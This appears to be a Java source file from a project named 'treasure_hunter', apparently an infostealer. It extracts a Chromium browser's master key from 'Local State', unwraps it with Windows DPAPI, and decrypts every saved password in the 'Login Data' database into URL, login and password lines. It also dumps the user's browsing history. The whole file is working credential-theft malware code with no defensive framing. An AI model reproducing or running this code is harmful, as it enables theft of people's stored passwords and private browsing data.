package com.treasure_hunter_java.decrypt;

import java.io.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.sql.*;
import java.util.Arrays;
import java.util.Base64;

import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;

import com.sun.jna.platform.win32.Crypt32Util;

import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Decrypt {

    public static byte[] getMasterKey(String directory) throws Exception {
        Path localStateFile = Path.of(directory + "/Local State");

        String localState = Files.readString(localStateFile, StandardCharsets.UTF_8);

        String masterKeyB64 = null;

        Pattern pattern = Pattern.compile("\"encrypted_key\":\"([^\"]+)\"");

        Matcher matcher = pattern.matcher(localState);

        if (matcher.find()) {
            masterKeyB64 = matcher.group(1);
        }
        byte[] masterKeyEnc = Base64.getDecoder().decode(masterKeyB64.getBytes(StandardCharsets.UTF_8));

        System.out.println(Crypt32Util.cryptUnprotectData(Arrays.copyOfRange(masterKeyEnc, 5, masterKeyEnc.length)).length);

        return Crypt32Util.cryptUnprotectData(Arrays.copyOfRange(masterKeyEnc, 5, masterKeyEnc.length));
    }

    private static final int GCM_TAG_LENGTH = 128;
    private static final int IV_LENGTH = 12;

    public static String decryptPassword(byte[] passwordBytes, byte[] masterKey) throws Exception {
        byte[] iv = Arrays.copyOfRange(passwordBytes, 3, IV_LENGTH + 3);
        byte[] ciphertext = Arrays.copyOfRange(passwordBytes, IV_LENGTH + 3, passwordBytes.length);
        byte[] aad = Arrays.copyOfRange(passwordBytes, 0, 3);

        SecretKeySpec keySpec = new SecretKeySpec(masterKey, "AES");
        GCMParameterSpec parameterSpec = new GCMParameterSpec(GCM_TAG_LENGTH, iv);

        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        cipher.init(Cipher.DECRYPT_MODE, keySpec, parameterSpec);
        //cipher.updateAAD(aad);

        byte[] decryptedPasswordBytes = cipher.doFinal(ciphertext);
        return new String(decryptedPasswordBytes, StandardCharsets.UTF_8);
    }

    public static String decryptPasswords(String directory) throws Exception {
        String text = "URL | LOGIN | PASSWORD\n";
        File dbFile = new File(directory + "/Login Data");
        Connection conn = null;
        try {
            conn = DriverManager.getConnection("jdbc:sqlite:" + dbFile.getAbsolutePath());
            Statement stmt = conn.createStatement();
            ResultSet rs = stmt.executeQuery("SELECT action_url, username_value, password_value FROM logins");

            byte[] masterKey = getMasterKey(directory);
            System.out.println(masterKey);

            while (rs.next()) {
                byte[] passwordBytes = rs.getBytes("password_value");
                String decryptedPassword = decryptPassword(passwordBytes, masterKey);
                String url = rs.getString("action_url");
                String login = rs.getString("username_value");
                if (!decryptedPassword.equals("")) {
                    text += url + " | " + login + " | " + decryptedPassword + "\n";
                }
            }
            rs.close();
            stmt.close();
        } catch (SQLException e) {
            e.printStackTrace();
        } finally {
            try {
                if (conn != null) {
                    conn.close();
                }
            } catch (SQLException e) {
                e.printStackTrace();
            }
        }

        return text;
    }

    public static String getHistory(String historyPath) {
        StringBuilder textBuilder = new StringBuilder();
        textBuilder.append("\n");

        File dbFile = new File(historyPath);

        try (Connection conn = DriverManager.getConnection("jdbc:sqlite:" + dbFile.getAbsolutePath());
             Statement stmt = conn.createStatement();
             ResultSet rs = stmt.executeQuery("SELECT id, url, title FROM urls")) {

            while (rs.next()) {
                int id = rs.getInt("id");
                String url = rs.getString("url");
                String title = rs.getString("title");
                textBuilder.append("ID: ").append(id)
                        .append(" | URL: ").append(url)
                        .append(" | Title: ").append(title)
                        .append("\n");
            }

        } catch (SQLException e) {
            e.printStackTrace();
        }

        return textBuilder.toString();
    }

}